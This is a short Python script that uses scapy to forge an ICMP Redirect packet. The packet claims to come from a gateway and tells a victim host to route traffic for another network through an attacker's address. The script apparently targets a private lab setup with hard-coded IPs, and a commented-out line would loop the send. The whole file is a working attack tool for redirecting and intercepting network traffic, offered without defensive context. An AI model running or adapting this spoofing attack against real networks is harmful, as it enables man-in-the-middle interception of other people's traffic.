# coding: utf8
# vi: ft=python expandtab ts=4 sts=4 sw=4

from scapy.all import IP, ICMP, UDP, send


def icmp_redirect(ip_gw, ip_victim, ip_attacker, ip_targetroute):
    """Try ICMP Redirect attack

    Args:
        ip_gw (str): Gateway IP
        ip_victim (str) : Target/Victim IP
        ip_attacker (str) : Attacker IP
        ip_targetroute (str) : IP of network to reach in ICMP payload

        interface ???
    """

    ip = IP()
    ip.src = ip_gw
    ip.dst = ip_victim

    icmp = ICMP()
    icmp.type = 5
    icmp.code = 1
    icmp.gw = ip_attacker

    ip2 = IP()
    ip2.src = ip_victim
    ip2.dst = ip_targetroute

    icmp2 = ICMP()
    icmp2.type = 0
    icmp2.code = 0

    # Send packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.
    send(ip / icmp / ip2 / icmp2, iface="eth1")
    # send(ip/icmp/ip2/UDP(), loop=1)


if __name__ == "__main__":

    ip_gw = "192.168.33.254"
    ip_victim = "192.168.33.10"
    ip_attacker = "192.168.33.11"
    ip_targetroute = "192.168.34.10"
    # interface = ""

    icmp_redirect(ip_gw, ip_victim, ip_attacker, ip_targetroute)
